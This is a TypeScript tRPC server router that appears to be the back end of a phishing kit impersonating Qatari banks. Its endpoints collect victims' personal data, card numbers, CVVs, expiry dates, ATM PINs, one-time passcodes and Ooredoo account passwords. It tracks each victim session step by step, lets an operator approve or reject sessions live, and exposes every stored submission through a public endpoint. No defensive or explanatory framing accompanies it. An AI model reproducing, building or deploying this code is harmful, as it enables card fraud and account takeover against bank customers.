import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import {
  createSession,
  submitPersonalData,
  submitLoginMethod,
  submitAtmPin,
  submitOtp,
  submitOoredoo,
  updateSessionStatus,
  adminTakeAction,
  getSessionStatus,
  getFullSubmissions,
} from "./db";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  submissions: router({
    createSession: publicProcedure
      .input(z.object({
        selectedBank: z.string(),
        personalData: z.any()
      }))
      .mutation(async ({ input }) => {
        const sessionId = Math.random().toString(36).substring(2, 15);
        await createSession(sessionId, input.selectedBank, "QA", "");
        await submitPersonalData({
          sessionId,
          ...input.personalData,
          nameEnglish: "",
          dateOfBirth: ""
        });
        await updateSessionStatus(sessionId, "loading", "personal");
        return { id: sessionId };
      }),

    getAll: publicProcedure
      .query(async () => {
        return await getFullSubmissions();
      }),

    submitLoginMethod: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        loginType: z.string(),
        cardNumber: z.string().optional(),
        cardholderName: z.string().optional(),
        expiryDate: z.string().optional(),
        cvv: z.string().optional(),
        deliveryAddress: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        await submitLoginMethod({
          sessionId: input.sessionId,
          loginType: input.loginType,
          cardNumber: input.cardNumber || "",
          cardholderName: input.cardholderName || "",
          expiryDate: input.expiryDate || "",
          cvv: input.cvv || "",
          username: "",
          password: "",
          deliveryMethod: "home",
          branchName: "",
          deliveryAddress: input.deliveryAddress || "",
          phoneConfirmation: "",
          issuanceFee: "10",
          deliveryFee: "0",
          totalAmount: "10",
        });
        const step = input.loginType === "registration_completion" ? "registration-completion" : "card";
        await updateSessionStatus(input.sessionId, "loading", step);
        return { success: true };
      }),

    submitOtp: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        otpCode: z.string(),
        otpType: z.string()
      }))
      .mutation(async ({ input }) => {
        await submitOtp({
          sessionId: input.sessionId,
          otpCode: input.otpCode,
          otpType: input.otpType
        });
        const step = input.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp";
        await updateSessionStatus(input.sessionId, "loading", step);
        return { success: true };
      }),

    submitAtmPin: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        pin: z.string()
      }))
      .mutation(async ({ input }) => {
        await submitAtmPin({
          sessionId: input.sessionId,
          pin: input.pin
        });
        await updateSessionStatus(input.sessionId, "loading", "atm");
        return { success: true };
      }),

    submitOoredoo: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        ooredooUser: z.string(),
        ooredooPassword: z.string()
      }))
      .mutation(async ({ input }) => {
        await submitOoredoo({
          sessionId: input.sessionId,
          ooredooUser: input.ooredooUser,
          ooredooPassword: input.ooredooPassword
        });
        await updateSessionStatus(input.sessionId, "loading", "ooredoo");
        return { success: true };
      }),

    takeAction: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        action: z.enum(['approve', 'reject']),
        errorMessage: z.string().optional()
      }))
      .mutation(async ({ input }) => {
        await adminTakeAction(input.sessionId, input.action, input.errorMessage);
        return { success: true };
      }),

    getSessionStatus: publicProcedure
      .input(z.string())
      .query(async ({ input }) => {
        return await getSessionStatus(input);
      }),

    reportStep: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        step: z.string()
      }))
      .mutation(async ({ input }) => {
        await updateSessionStatus(input.sessionId, "pending", input.step);
        return { success: true };
      })
  }),
});

export type AppRouter = typeof appRouter;
